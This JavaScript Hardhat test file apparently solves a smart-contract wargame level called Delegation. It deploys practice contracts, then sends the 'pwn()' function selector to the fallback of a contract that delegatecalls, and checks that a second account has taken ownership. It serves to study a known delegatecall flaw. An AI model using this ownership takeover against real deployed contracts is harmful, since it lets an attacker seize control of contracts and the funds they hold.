const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Delegation", function () {
  async function deployOneYearLockFixture() {
    const [owner, otherAccount] = await ethers.getSigners();
    const DelegateContract = await ethers.getContractFactory("Delegate");
    const Delegate = await DelegateContract.deploy(owner.address);
    await Delegate.deployed();
    const DelegationContract = await ethers.getContractFactory("Delegation");
    const Delegation = await DelegationContract.deploy(Delegate.address);
    await Delegation.deployed();

    // Helper Contract To get Function Selector
    const getSelectorsContract = await ethers.getContractFactory(
      "getSelectors"
    );
    const getSelectors = await getSelectorsContract.deploy();
    await getSelectors.deployed();

    return { Delegation, getSelectors, owner, otherAccount };
  }

  describe("Deployment", function () {
    it("Should Become the owner of the delegate contract", async function () {
      const { Delegation, getSelectors, owner, otherAccount } =
        await loadFixture(deployOneYearLockFixture);
      const Owner = await Delegation.owner();
      expect(Owner).to.equal(owner.address);

      const fnSelector = await getSelectors.getSelector("pwn()");

      // call fallback fn with msg.data to modify the owner..
      const tx = await otherAccount.sendTransaction({
        to: Delegation.address,
        data: fnSelector,
      });
      await tx.wait(1);

      const newOwner = await Delegation.owner();
      expect(newOwner).to.equal(otherAccount.address);
    });
  });
});
